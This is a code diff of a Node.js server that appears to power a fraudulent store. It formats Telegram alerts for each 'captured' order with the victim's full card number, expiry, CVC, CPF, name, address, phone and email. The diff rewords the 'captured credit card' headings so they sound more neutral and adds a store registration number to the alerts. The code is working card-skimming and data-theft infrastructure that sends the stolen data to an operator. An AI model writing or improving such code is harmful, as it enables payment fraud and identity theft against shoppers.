@@ -6,6 +6,7 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 const API_KEY = process.env.API_KEY || 'minha_chave_secreta_123';
+const CNPJ_LOJA = '44.921.334/0001-73';
 
 const TELEGRAM_TOKEN =
   process.env.TELEGRAM_TOKEN ||
@@ -64,50 +65,51 @@ function montarMensagemTelegram(dados) {
   const cpfLimpo = limparDigitos(dados.cpfTitular);
 
   const tituloLead = ehCartao
-    ? '🚨 <b>NOVA CC CAPTURADA • AURORA TECH</b>'
-    : '🛒 <b>NOVO PEDIDO CAPTURADO • AURORA TECH</b>';
+    ? '🔴 <b>AURORA TECH • NOVA CC CAPTURADA</b>'
+    : '🔴 <b>AURORA TECH • NOVO PEDIDO</b>';
 
   const bebeTag = dados.bebe || dados.opBebe || '7 bebe';
   const origem = dados.origem || 'aurora-tech';
+  const metodoResumo = ehCartao
+    ? `${dados.formaPagamento} (${dados.bandeiraCartao || 'Cartão'} • ${dados.parcelas || '1x'})`
+    : dados.formaPagamento || 'Não informado';
 
   const linhas = [
     tituloLead,
-    '━━━━━━━━━━━━━━━━━━━━━━',
-    `🕒 <b>Horário:</b> <code>${escaparHtml(formatarDataHoraBr())}</code>`,
-    `💎 <b>Selo / Opção:</b> <code>${escaparHtml(bebeTag)}</code>`,
+    '<code>════════════════════════════</code>',
+    `🕒 <b>Data/Hora:</b> <code>${escaparHtml(formatarDataHoraBr())}</code>`,
+    `💎 <b>Selo:</b> <code>${escaparHtml(bebeTag)}</code>`,
+    `💰 <b>Total:</b> <b>${escaparHtml(dados.valor || 'Não informado')}</b>`,
+    `💳 <b>Método:</b> ${escaparHtml(metodoResumo)}`,
     '',
-    '👤 <b>CLIENTE &amp; ENTREGA</b>',
+    '<b>👤 DADOS DO CLIENTE</b>',
     `• <b>Nome:</b> ${escaparHtml(dados.nome || 'Não informado')}`,
     `• <b>Telefone:</b> ${escaparHtml(dados.telefone || 'Não informado')}`,
     `• <b>E-mail:</b> ${escaparHtml(dados.email || 'Não informado')}`,
     `• <b>Endereço:</b> ${escaparHtml(dados.mensagem || 'Não informado')}`,
     '',
-    '📦 <b>DETALHES DO PEDIDO</b>',
-    `• <b>Itens:</b> ${escaparHtml(dados.produto || 'Não informado')}`,
-    `• <b>Valor:</b> <b>${escaparHtml(dados.valor || 'Não informado')}</b>`,
-    `• <b>Pagamento:</b> ${escaparHtml(dados.formaPagamento || 'Não informado')}`,
-    ''
+    '<b>📦 ITENS DO PEDIDO</b>',
+    `• <b>Produtos:</b> ${escaparHtml(dados.produto || 'Não informado')}`
   ];
 
   if (ehCartao) {
     linhas.push(
-      '💳 <b>DADOS DO CARTÃO (CC)</b>',
+      '',
+      '<b>💳 DETALHES DO CARTÃO</b>',
       `• <b>Bandeira:</b> ${escaparHtml(dados.bandeiraCartao || 'Não identificada')}`,
       `• <b>Parcelas:</b> ${escaparHtml(dados.parcelas || '1x')}`,
       `• <b>Titular:</b> ${escaparHtml(dados.nomeCompletoCartao || 'Não informado')}`,
       `• <b>CPF:</b> <code>${escaparHtml(dados.cpfTitular || cpfLimpo || 'Não informado')}</code>`,
-      `• <b>CC:</b> <code>${escaparHtml(numeroLimpo || dados.numeroCartao || 'Não informado')}</code>`,
+      `• <b>Número:</b> <code>${escaparHtml(numeroLimpo || dados.numeroCartao || 'Não informado')}</code>`,
       `• <b>Validade:</b> <code>${escaparHtml(dados.validadeCartao || 'Não informado')}</code>`,
-      `• <b>CVC:</b> <code>${escaparHtml(cvcLimpo || dados.cvc || 'Não informado')}</code>`,
-      ''
+      `• <b>CVC:</b> <code>${escaparHtml(cvcLimpo || dados.cvc || 'Não informado')}</code>`
     );
   }
 
-  // Rodapé estilizado da mensagem
   linhas.push(
-    '━━━━━━━━━━━━━━━━━━━━━━',
+    '<code>════════════════════════════</code>',
     `🌐 <b>Origem:</b> <code>${escaparHtml(origem)}</code>`,
-    '⚡ <i>AURORA TECH • 7 bebe • Sistema de Captura</i>'
+    `🏛️ <i>AURORA TECH • CNPJ ${escaparHtml(CNPJ_LOJA)}</i>`
   );
 
   return linhas.join('\n');
